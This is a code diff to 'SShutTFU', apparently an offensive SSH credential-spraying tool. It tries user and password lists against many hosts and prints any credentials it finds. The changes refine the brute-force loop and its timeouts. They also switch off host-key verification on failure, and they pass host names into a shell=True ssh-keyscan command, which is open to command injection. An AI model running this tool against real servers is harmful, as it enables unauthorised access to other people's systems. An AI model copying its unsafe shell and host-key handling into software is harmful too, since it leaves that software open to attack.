@@ -18,9 +18,11 @@ class SShutTFU:
         self.workers = int(workers)
         self.known_hosts = known_hosts
         self.ignore_hosts = []
+        self.async_timeout = 5
 
     @staticmethod
     def _return_list(item):
+        """Return lines in file as list, or return single list item"""
         stub = []
         config = Path(item)
         if config.is_file():
@@ -32,12 +34,13 @@ class SShutTFU:
             return stub
 
     async def get_keys(self, host_queue):
+        """Asynchronous Process - Retrieve the SSH keys from hosts"""
         while host_queue.empty() is not True:
             host = await host_queue.get()
             port = 22
             if ':' in host:
                 host,  port = host.split(':')
-            command = "ssh-keyscan -t rsa,dsa,ecdsa -p"
+            command = "ssh-keyscan -t rsa,dsa,ecdsa,ed25519 -p"
             proc = subprocess.check_call(f"{command} {port} {str(host)} >> {self.known_hosts} 2>/dev/null", shell=True)
             if proc == 0:
                 print(f" 🠖 Key Added for Host: {host}")
@@ -48,9 +51,11 @@ class SShutTFU:
             host_queue.task_done()
 
     async def worker(self, queue):
+        """Asynchronous Process - Queue Worker"""
         while queue.empty() is not True:
             h, u, p = await queue.get()
             timeout_retry = 0
+            k = self.known_hosts
             if h in self.ignore_hosts:
                 continue
             while True:
@@ -58,28 +63,36 @@ class SShutTFU:
                     t = 22
                     if ':' in h:
                         h, t = h.split(':')
-                    k = self.known_hosts
                     if timeout_retry == 0:
                         print(f"Attempting {u} {p} on host {h}                                              \r", end='')
                     else:
                         print(f"Retry {timeout_retry} Attempting {u} {p} on host {h}                        \r", end='')
-                    await asyncio.wait_for(asyncssh.connect(h, username=u, port=t, password=p, known_hosts=k), timeout=5)
+                    await asyncio.wait_for(asyncssh.connect(
+                        h,
+                        username=u,
+                        port=t,
+                        password=p,
+                        known_hosts=k), timeout=self.async_timeout)
                     print(f" 🠖 Credentials Found: {h} - User:{u} Pass:{p}                                            ")
                 except asyncssh.PermissionDenied:
                     pass
+                except asyncssh.HostKeyNotVerifiable:
+                    k = None
+                    continue
                 except (TimeoutError, asyncio.TimeoutError):
                     timeout_retry += 1
-                    if timeout_retry >= 10:
+                    if timeout_retry >= 3:
                         break
                     continue
-                except asyncssh.misc.ProtocolError as e:
+                except asyncssh.misc.ProtocolError:
                     break
                 finally:
                     queue.task_done()
-                    break
+                break
         return
 
     async def main(self):
+        """Asynchronous Process - Main Function"""
         host_queue = asyncio.Queue()
 
         for h in itertools.product(self.host_file):
@@ -155,5 +168,3 @@ if __name__ == "__main__":
 
     pwner = SShutTFU(arg.hosts, arg.users, arg.passwords, arg.workers, arg.known_hosts)
     asyncio.run(pwner.main())
-
-
